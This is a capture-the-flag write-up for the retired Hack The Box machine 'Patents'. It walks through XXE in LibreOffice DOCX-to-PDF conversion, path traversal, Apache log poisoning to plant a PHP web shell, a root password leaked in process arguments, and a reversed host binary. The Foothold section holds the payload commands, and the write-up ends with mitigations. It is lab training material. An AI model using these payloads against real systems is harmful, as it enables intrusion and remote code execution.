---
machine: Patents
os: Linux
difficulty: Hard
platform: Hack The Box
state: Retired
tags: [linux, web, xxe, libreoffice, log-poisoning, docker, reversing]
---

# Patents — Hack The Box (Linux)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference note; no real flags or credentials.

## TL;DR

The application converts DOCX files to PDF with LibreOffice and is vulnerable to XXE, exposing its configuration and revealing another section. A traversal plus log poisoning yields execution in the web container; the root password appears in the process list and a host binary service is reversed to escape.

## Recon

```bash
nmap -Pn -sCV -p22,80,3000,5000 <IP>
```

- Ports: `22/tcp` SSH, `80/tcp` HTTP and internal application services.
- Services: Patent portal, LibreOffice converter and a custom binary service.
- Technologies: PHP, LibreOffice, Docker, Apache logs and an ELF binary.

## Enumeration

- `patents.htb` with DOCX upload.
- PDF conversion through LibreOffice.
- Additional vhost or path disclosed in the configuration.
- Web container with host mounts and a binary service.

## Foothold

Create a DOCX with an external entity in its metadata; LibreOffice resolves it during conversion and the PDF reflects the file. The configuration reveals a traversal path; poison the Apache log and execute PHP in the container.

```bash
# DOCX with XXE in document.xml or metadata
python3 make_xxe_docx.py file:///var/www/html/config.php
curl -s -F "file=@payload.docx" http://patents.htb/convert.php
curl -s "http://patents.htb/download.php?file=../../../../var/log/apache2/access.log"
curl -A '<?php system($_GET["c"]); ?>' http://patents.htb/
```

## Lateral movement

The container shell exposes the configuration and the host service. The root password is found in the process list and reused for the next hop.

## Privilege escalation

The host binary service communicates with the application and can be reversed. Identify the weak validation or invoked command and build a payload that runs a shell as root on the host.

```bash
ps auxww
cat /proc/<PID>/cmdline
# Extract the service binary and analyze it
ghidra
# Send the payload to the internal service port
```

## Evidence

- XXE DOCX and configuration read.
- PHP execution after log poisoning.
- Password in process arguments and host root shell.

## Lessons learned

- LibreOffice is a complex parser and an XXE surface.
- Writable logs turn a traversal into RCE.
- Secrets in command lines leak through `/proc`.

## Mitigation and detection

- Disable external entities and macros in LibreOffice; isolate the converter.
- Block traversal and log writes from the application.
- Pass secrets through protected environment variables or files, not arguments.

## References

- [0xdf — Patents](https://0xdf.gitlab.io/2020/05/16/htb-patents.html)
- [IppSec — Patents](https://www.youtube.com/watch?v=XqsURG_agvY)
- [Hack The Box — Patents](https://app.hackthebox.com/machines/patents)
